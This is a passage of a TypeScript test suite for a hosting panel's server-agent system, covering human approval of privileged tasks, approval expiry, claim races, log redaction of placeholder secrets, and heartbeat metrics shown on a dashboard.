    expect(await agents.claimTask(agent.id)).toBeNull();
    expect((await db.auditLog.findFirst({ where: { action: "AGENT_TASK_REJECTED", resourceId: task.id } })).actorEmail).toBe(ADMIN.email);

    // Approval of a task that is not gated is refused rather than silently accepted.
    const read = await agents.dispatchTask({ agentId: agent.id, command: "metrics.collect" });
    expect(read.requiresApproval).toBe(false);
    const notGated = await agents.approveAgentTask(read.id, ADMIN);
    expect(notGated.ok).toBe(false);
    if (notGated.ok) return;
    expect(notGated.reason).toContain("does not require approval");
  });

  it("dispatches an ungated read-only task and lets the agent claim it immediately", async () => {
    const { agent } = await makeAgent({ name: "claim-host" });
    const task = await agents.dispatchTask({ agentId: agent.id, command: "metrics.collect", correlationId: "corr-1" });
    expect(task.requiresApproval).toBe(false);
    const claimed = await agents.claimTask(agent.id);
    expect(claimed?.id).toBe(task.id);
    expect(claimed?.timeoutMs).toBe(findAllowlistEntry("metrics.collect")!.timeoutMs);
  });

  it("redacts secrets from reported logs and audits execution of a privileged command", async () => {
    const { agent } = await makeAgent({ name: "result-host", capabilities: [...DEFAULT_AGENT_CAPABILITIES, "service.restart"] });
    const task = await agents.dispatchTask({ agentId: agent.id, command: "service.restart", args: { unit: "alo.service" } });
    await agents.approveAgentTask(task.id, ADMIN);
    await agents.claimTask(agent.id);

    const recorded = await agents.recordTaskResult(task.id, {
      status: "SUCCEEDED",
      exitCode: 0,
      result: { restarted: true },
      logs: "restarting alo.service\nGITHUB_TOKEN=ghp_0123456789abcdefghijklmnopqrstuv\npassword=sup3rs3cret",
    });
    expect(recorded.status).toBe("SUCCEEDED");
    expect(recorded.logs).not.toContain("ghp_0123456789");
    expect(recorded.logs).not.toContain("sup3rs3cret");
    expect(recorded.logs).toContain("restarting alo.service");
    expect(recorded.finishedAt).not.toBeNull();

    const executed = await db.auditLog.findFirst({ where: { action: "AGENT_TASK_EXECUTED", resourceId: task.id } });
    expect(executed).not.toBeNull();
    expect(executed.result).toBe("SUCCEEDED");
  });

  it("times out tasks no agent claimed inside the claim window, and never claims them afterwards", async () => {
    const { agent } = await makeAgent({ name: "stale-host" });
    const task = await agents.dispatchTask({ agentId: agent.id, command: "metrics.collect" });
    await db.agentTask.update({ where: { id: task.id }, data: { createdAt: new Date(Date.now() - agents.TASK_CLAIM_TTL_MS - 60_000) } });

    expect(await agents.claimTask(agent.id)).toBeNull();
    const expired = await agents.expireStaleTasks();
    expect(expired).toBeGreaterThanOrEqual(1);
    const row = await db.agentTask.findUnique({ where: { id: task.id } });
    expect(row.status).toBe("TIMED_OUT");
    expect(row.error).toContain("No agent claimed this task");
  });

  it("revokes an approval that has aged out, so stale authority cannot execute a task", async () => {
    const { agent } = await makeAgent({ name: "approval-ttl-host", capabilities: [...DEFAULT_AGENT_CAPABILITIES, "service.restart"] });
    const task = await agents.dispatchTask({ agentId: agent.id, command: "service.restart", args: { unit: "alo.service" } });
    expect(task.requiresApproval).toBe(true);
    expect((await agents.approveAgentTask(task.id, ADMIN)).ok).toBe(true);

    // Fresh approval: claimable.
    expect(await agents.claimTask(agent.id, Date.now())).not.toBeNull();
    await agents.recordTaskResult(task.id, { status: "SUCCEEDED", exitCode: 0 });

    const second = await agents.dispatchTask({ agentId: agent.id, command: "service.restart", args: { unit: "alo.service" } });
    expect((await agents.approveAgentTask(second.id, ADMIN)).ok).toBe(true);
    const afterTtl = Date.now() + agents.AGENT_APPROVAL_TTL_MS + 60_000;
    expect(await agents.claimTask(agent.id, afterTtl)).toBeNull();

    // The sweep clears the stale approval so the dashboard shows it as waiting
    // for a human again, rather than leaving a task that looks approved forever.
    await db.agentTask.update({ where: { id: second.id }, data: { approvedAt: new Date(Date.now() - agents.AGENT_APPROVAL_TTL_MS - 1000) } });
    await agents.expireStaleTasks();
    const cleared = await db.agentTask.findUnique({ where: { id: second.id } });
    expect(cleared.status).toBe("PENDING");
    expect(cleared.approvedBy).toBeNull();
    expect(cleared.approvedAt).toBeNull();
    expect(await db.auditLog.findFirst({ where: { action: "AGENT_TASK_APPROVAL_EXPIRED" } })).not.toBeNull();

    // Re-approval makes it claimable again.
    expect((await agents.approveAgentTask(second.id, ADMIN, "re-approved after the window lapsed")).ok).toBe(true);
    expect(await agents.claimTask(agent.id)).not.toBeNull();
  });

  it("hands a task to exactly one claimant when several poll at the same moment", async () => {
    const { agent } = await makeAgent({ name: "claim-race-host" });
    const task = await agents.dispatchTask({ agentId: agent.id, command: "metrics.collect" });
    const results = await Promise.all(Array.from({ length: 5 }, () => agents.claimTask(agent.id)));
    const won = results.filter((r) => r?.id === task.id);
    expect(won).toHaveLength(1);
    expect((await db.agentTask.findUnique({ where: { id: task.id } })).status).toBe("ASSIGNED");
  });

  it("parses capability and scope lists defensively", () => {
    expect(agents.parseArray('["a","b"]')).toEqual(["a", "b"]);
    expect(agents.parseArray("not json")).toEqual([]);
    expect(agents.parseArray(null)).toEqual([]);
    expect(agents.parseArray('{"a":1}')).toEqual([]);
    expect(agents.parseArray("[1,2]")).toEqual(["1", "2"]);
  });
});

// ── Heartbeats: real numbers mirrored into the existing servers UI ───────────

describe("agent heartbeat and metrics", () => {
  it("stores reported metrics, mirrors them onto the Server row, and marks it online", async () => {
    const server = await db.server.create({
      data: { name: "Office A", hostname: `office-a-${Date.now()}.local`, ip: "10.0.0.11", cpuCores: 4, ramGb: 16, diskGb: 240, status: "OFFLINE" },
    });
    const { agent } = await makeAgent({ name: "heartbeat-host", serverId: server.id });

    await agents.recordHeartbeat(
      agent.id,
      {
        version: "1.0.0",
        capabilities: ["metrics.collect", "service.status", "shell.exec"], // unknown ones are dropped
        metrics: {
          cpuPercent: 12.5,
          memoryUsedMb: 4096,
          memoryTotalMb: 16384,
          diskUsedGb: 40,
          diskTotalGb: 240,
          loadAvg1m: 0.42,
          uptimeSeconds: 86_400,
          netInKbps: 120,
          netOutKbps: 40,
          services: [{ name: "alo-hosting-panel.service", state: "active" }],
        },
      },
      "10.0.0.11",
    );

    const after = await db.serverAgent.findUnique({ where: { id: agent.id } });
    expect(after.lastHeartbeat).not.toBeNull();
    expect(after.lastSeenIp).toBe("10.0.0.11");
    expect(agents.parseArray(after.capabilities)).not.toContain("shell.exec");
    expect(agents.agentOnline(after)).toBe(true);

    const metric = await db.agentMetric.findFirst({ where: { agentId: agent.id }, orderBy: { recordedAt: "desc" } });
    expect(metric.cpuPercent).toBe(12.5);
    expect(metric.memoryTotalMb).toBe(16384);
    expect(metric.uptimeSeconds).toBe(86_400);
    expect(JSON.parse(metric.services)[0].state).toBe("active");

    const mirrored = await db.server.findUnique({ where: { id: server.id } });
    expect(mirrored.status).toBe("ONLINE");
    expect(mirrored.cpuUsage).toBe(12.5);
    expect(mirrored.memoryUsage).toBeCloseTo(25, 5);
    expect(mirrored.diskUsage).toBeCloseTo((40 / 240) * 100, 5);
    expect(mirrored.uptime).toBe(86_400);
    expect(await db.serverMetric.count({ where: { serverId: server.id } })).toBe(1);
  });

  it("records unknown values as null instead of inventing zeros", async () => {
    const { agent } = await makeAgent({ name: "partial-metrics-host" });
    await agents.recordHeartbeat(agent.id, { metrics: { cpuPercent: Number.NaN, memoryUsedMb: 1024, diskUsedGb: null } });
    const metric = await db.agentMetric.findFirst({ where: { agentId: agent.id }, orderBy: { recordedAt: "desc" } });
    expect(metric.cpuPercent).toBeNull();
    expect(metric.memoryUsedMb).toBe(1024);
    expect(metric.diskUsedGb).toBeNull();
    expect(metric.memoryTotalMb).toBeNull();
  });

  it("treats an agent as offline once its heartbeat is older than the online window", () => {
    const now = Date.now();
    expect(agents.agentOnline({ lastHeartbeat: new Date(now - 1000), status: "active" }, now)).toBe(true);
    expect(agents.agentOnline({ lastHeartbeat: new Date(now - 10 * 60_000), status: "active" }, now)).toBe(false);
    expect(agents.agentOnline({ lastHeartbeat: null, status: "active" }, now)).toBe(false);
    expect(agents.agentOnline({ lastHeartbeat: new Date(now), status: "pending" }, now)).toBe(false);
  });

  it("describes agents for the dashboard without leaking secret material", async () => {
    const { agent } = await makeAgent({ name: "describe-host" });
    await agents.recordHeartbeat(agent.id, { metrics: { cpuPercent: 3 } });
    const described = await agents.describeAgents();
    const row = described.find((a) => a.id === agent.id);
    expect(row).toBeDefined();
    expect(row!.online).toBe(true);
    expect(row!.latestMetric?.cpuPercent).toBe(3);
    expect(row!.heartbeatAgeMs).toBeGreaterThanOrEqual(0);
    const serialized = JSON.stringify(row);
    expect(serialized).not.toContain("secretEnc");
    expect(serialized).not.toContain("alo_ags_");
    expect(serialized).toContain(agent.agentKey); // the public identity is safe to show
  });
});
